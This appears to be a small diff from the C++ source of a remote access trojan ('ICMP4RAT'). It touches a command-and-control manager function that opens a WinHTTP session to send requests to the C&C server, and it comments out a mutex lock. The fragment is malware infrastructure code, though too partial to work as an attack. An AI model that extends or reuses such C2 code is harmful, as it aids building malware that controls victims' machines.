@@ -27,7 +27,7 @@ cncManager::~cncManager() {
 
 /* C&C에 http request를 보내는 함수. send후 response parsing을 호출함. */
 void cncManager::sendHttpRequest(LPVOID data, DWORD dlen) {
-    std::lock_guard<std::mutex> guard(this->m1);
+    //std::lock_guard<std::mutex> guard(this->m1);
     this->hSession = WinHttpOpen(L"ICMP4RAT", WINHTTP_ACCESS_TYPE_DEFAULT_PROXY, WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0);
 
     if (this->hSession)
